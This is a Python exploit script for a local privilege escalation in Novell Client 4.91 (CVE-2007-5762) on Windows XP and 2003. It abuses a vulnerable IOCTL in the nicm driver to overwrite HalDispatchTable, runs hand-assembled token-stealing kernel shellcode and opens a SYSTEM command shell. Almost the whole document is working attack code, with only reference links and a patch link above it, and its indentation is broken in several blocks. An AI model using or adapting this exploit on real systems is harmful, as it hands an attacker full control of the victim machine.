# Novell Client 4.91 SP3/4 Privilege escalation exploit
# Download link: http://download.novell.com/Download?buildid=SyZ1G2ti7wU~
#
# SecurityFocus: http://www.securityfocus.com/bid/27209/info
# CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5762
# Patch: http://download.novell.com/Download?buildid=4FmI89wOmg4~
#
# Author: sickness@offensive-security.com
# Version Tested: Novell Client 4.91 SP4
# Targets: Exploit works on all service packs of Win2K3 and WinXP (except Windows XP SP1)
# Thanks:
#       - g0tmi1k for helping me test out the exploit on as many versions of Windows as possible.
#       - ryujin for the help while developing the exploit.
 
from ctypes import *
import sys,struct,os
from optparse import OptionParser
 
kernel32 = windll.kernel32
ntdll    = windll.ntdll
Psapi    = windll.Psapi
 
def GetBase(drvname=None):
    EVIL_ARRAY            = 1024
    myarray               = c_ulong * EVIL_ARRAY
    lpImageBase           = myarray()
    cb                    = c_int(1024)
    lpcbNeeded            = c_long()
    drivername_size       = c_long()
    drivername_size.value = 48
    Psapi.EnumDeviceDrivers(byref(lpImageBase), cb, byref(lpcbNeeded))
    for baseaddr in lpImageBase:
        drivername = c_char_p("\x00"*drivername_size.value)
        if baseaddr:
            Psapi.GetDeviceDriverBaseNameA(baseaddr, drivername,
                            drivername_size.value)
            if drvname:
                if drivername.value.lower() == drvname:
                    print "[>] Retrieving %s information." % drvname
                    print "[>] %s base address: %s" % (drvname, hex(baseaddr))
                    return baseaddr
            else:
                if drivername.value.lower().find("krnl") !=-1:
                    print "[>] Retrieving Kernel information."
                    print "[>] Kernel version: ", drivername.value
                    print "[>] Kernel base address: %s" % hex(baseaddr)
                    return (baseaddr, drivername.value)
    return None
 
if __name__ == '__main__':
 
    usage =  "%prog -o <target>"
        parser = OptionParser(usage=usage)
        parser.add_option("-o", type="string",
                  action="store", dest="target_os",
                  help="Available target operating systems: XP, 2K3")
        (options, args) = parser.parse_args()
        OS = options.target_os
        if not OS or OS.upper() not in ['XP','2K3']:
           parser.print_help()
           sys.exit()
        OS = OS.upper()
     
    GENERIC_READ = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 0x3
    DEVICE = '\\\\.\\nicm'
     
    device_handler = kernel32.CreateFileA(DEVICE, GENERIC_READ|GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
     
    (krnlbase, kernelver) = GetBase()
    hKernel = kernel32.LoadLibraryExA(kernelver, 0, 1)
    HalDispatchTable = kernel32.GetProcAddress(hKernel, "HalDispatchTable")
    HalDispatchTable -= hKernel
    HalDispatchTable += krnlbase
    HalBase = GetBase("hal.dll")
    print "[>] HalDispatchTable address:", hex(HalDispatchTable)
    HalDispatchTable0x4 = HalDispatchTable + 0x4
    HalDispatchTable0x8 = HalDispatchTable0x4 + 0x4
    HalDispatchTable_0x14 = HalDispatchTable0x4 - 0x10
 
    if OS == "2K3":
            HaliQuerySystemInformation = HalBase + 0x1fa1e # Offset for 2003
            HalpSetSystemInformation   = HalBase + 0x21c60 # Offset for 2003
 
        else:
            HaliQuerySystemInformation = HalBase + 0x16bba # Offset for XP
            HalpSetSystemInformation   = HalBase + 0x19436# Offset for XP
             
        print "[>] HaliQuerySystemInformation address:", hex(HaliQuerySystemInformation)
        print "[>] HalpSetSystemInformation address:", hex(HalpSetSystemInformation)
     
    EVIL_IOCTL = 0x00143B6B # Vulnerable IOCTL
    retn = c_ulong()
    inut_buffer = HalDispatchTable0x4 - 0x10 + 0x3 # Make the pwnsauce overwrite
    inut_size = 0x0
    output_buffer = 0x41414141 # Junk
    output_size = 0x0
 
        # Get offsets
        if OS == "2K3":
            _KPROCESS = "\x38" # Offset for 2003
            _TOKEN    = "\xd8" # Offset for 2003
            _UPID     = "\x94" # Offset for 2003
            _APLINKS  = "\x98" # Offset for 2003
 
        else:
            _KPROCESS = "\x44" # Offset for XP
            _TOKEN    = "\xc8" # Offset for XP
            _UPID     = "\x84" # Offset for XP
            _APLINKS  = "\x88" # Offset for XP
 
        # Restore the pointer
        pointer_restore =   "\x31\xc0" + \
                 "\xb8" + struct.pack("L", HalpSetSystemInformation) + \
                 "\xa3" + struct.pack("L", HalDispatchTable0x8) + \
                 "\xb8" + struct.pack("L", HaliQuerySystemInformation) + \
                 "\xa3" + struct.pack("L", HalDispatchTable0x4)
 
        # Make the evil token stealing
        steal_token =  "\x52"                                 +\
                 "\x53"                                 +\
                 "\x33\xc0"                             +\
                 "\x64\x8b\x80\x24\x01\x00\x00"         +\
                 "\x8b\x40" + _KPROCESS                 +\
                 "\x8b\xc8"                             +\
                 "\x8b\x98" + _TOKEN + "\x00\x00\x00"   +\
                 "\x89\x1d\x00\x09\x02\x00"             +\
                 "\x8b\x80" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xe8" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xb8" + _UPID + "\x00\x00\x00\x04\x00\x00\x00" +\
                 "\x75\xe8"                             +\
                 "\x8b\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x8b\xc1"                             +\
                 "\x89\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x5b"                                 +\
                 "\x5a"                                 +\
                 "\xc2\x10"
 
        # Build the shellcode
        sc = "\x90" * 100
        sc+= pointer_restore + steal_token
        sc+= "\x90" * 100
     
    if OS == "2K3":
        baseadd    = c_int(0x02a6ba10)
         
    else:
        baseadd    = c_int(0x026e7bb0)
         
    MEMRES     = (0x1000 | 0x2000)
    PAGEEXE    = 0x00000040
    Zero_Bits   = c_int(0)
    RegionSize = c_int(0x1000)
    write    = c_int(0)
 
    dwStatus = ntdll.NtAllocateVirtualMemory(-1, byref(baseadd), 0x0, byref(RegionSize), MEMRES, PAGEEXE)
     
    if OS == "2K3":
        kernel32.WriteProcessMemory(-1, 0x02a6ba10, sc, 0x1000, byref(write))
     
    else:
        kernel32.WriteProcessMemory(-1, 0x026e7bb0, sc, 0x1000, byref(write))
         
    if device_handler:
        print "[>] Sending IOCTL to the driver."
        dev_io = kernel32.DeviceIoControl(device_handler, EVIL_IOCTL, inut_buffer, inut_size, output_buffer, output_size, byref(retn), None)
     
    evil_in  = c_ulong()
    evil_out  = c_ulong()
    evil_in  = 0x1337
    hola = ntdll.NtQueryIntervalProfile(evil_in, byref(evil_out))
    print "[>] Launching shell as SYSTEM."
    os.system("cmd.exe /K cd c:\\windows\\system32")
